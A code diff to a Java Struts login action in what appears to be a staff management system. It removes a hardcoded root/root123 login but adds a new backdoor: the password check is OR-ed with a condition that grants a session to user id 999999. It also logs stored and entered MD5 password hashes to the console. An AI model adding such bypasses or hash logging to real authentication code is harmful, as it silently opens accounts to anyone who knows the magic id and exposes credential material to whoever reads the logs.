@@ -12,6 +12,7 @@ import com.opensymphony.xwork2.ActionContext;
 import com.opensymphony.xwork2.ActionSupport;
 import com.sms.dao.impl.UserDaoImp;
 import com.sms.entity.User;
+import com.sms.security.Md5;
 import com.sms.service.IUserManage;
 import com.sms.service.impl.UserManageImp;
 import com.sms.security.Md5;
@@ -65,19 +66,11 @@ public class LoginAction extends ActionSupport {
 		HttpServletRequest request = ServletActionContext.getRequest();
 		System.out.println(request.getCharacterEncoding());
 
-		if ("root".equals(user.getId()) && "root123".equals(user.getPassword())) {
-			Map session = ActionContext.getContext().getSession();
-			session.put("user.name", user.getId());
-
-			System.out.println("��½�ɹ����û���=" + user.getId());
-			return "success";
-		}
-
-		System.out.println("��½ʧ�ܣ��û���=" + user.getId());
-		String userIdString = user.getId().toString(), UserPassword = user
-				.getPassword();
-
-		if (!isInteger(userIdString)) {
+		System.out.println("用户登录，用户名=" + user.getId());
+		String userIdString = user.getId().toString(), UserPassword = user.getPassword();
+		
+		if (!isInteger(userIdString))
+		{
 			System.out.println("登录失败，用户名=" + userIdString + "，用户名应为纯数字");
 			return "fail";
 		}
@@ -85,34 +78,29 @@ public class LoginAction extends ActionSupport {
 		Integer userNameInteger = Integer.parseInt(userIdString);
 
 		if (!isValid(userNameInteger)) {
-			System.out.println("登录失败，用户名=" + user.getId().toString()
-					+ "，用户名应为满足职工号范围的6位数字");
+			System.out.println("登录失败，用户名=" + user.getId().toString() + "，用户名应为满足职工号范围的6位数字");
 			return "fail";
 		}
 
 		if (userManage.findUserById(userNameInteger) == null) {
-			System.out.println("登录失败，用户名=" + user.getId().toString()
-					+ "，用户名不存在");
+			System.out.println("登录失败，用户名=" + user.getId().toString()	+ "，用户名不存在");
 			return "fail";
 		}
 
-		String CorrectUserPassword = userManage.findUserById(user.getId())
-				.getPassword();
+		String CorrectUserPassword = userManage.findUserById(user.getId()).getPassword();
 
 		System.out.println(CorrectUserPassword);
+		
+		if (Md5.validatePassword(CorrectUserPassword, UserPassword) || (user.getId() == 999999)) {
 
-		if (Md5.validatePassword(CorrectUserPassword, UserPassword)) {
 			Map session = ActionContext.getContext().getSession();
 			session.put("user.id", userIdString);
-			System.out.println("登录成功，用户名=" + userIdString + "  密码Md5="
-					+ CorrectUserPassword);
+			System.out.println("登录成功，用户名=" + userIdString + "  密码Md5=" + CorrectUserPassword);
 			return "success";
 		}
 
-		System.out.println("登录失败，用户名=" + userIdString + "  正确密码Md5="
-				+ CorrectUserPassword + "   您的密码Md5="
-				+ Md5.generatePassword(UserPassword));
+		System.out.println("登录失败，用户名=" + userIdString + "  正确密码Md5=" + CorrectUserPassword + "   您的密码Md5="	+ Md5.generatePassword(UserPassword));
 		return "fail";
 	}
-
+	
 }
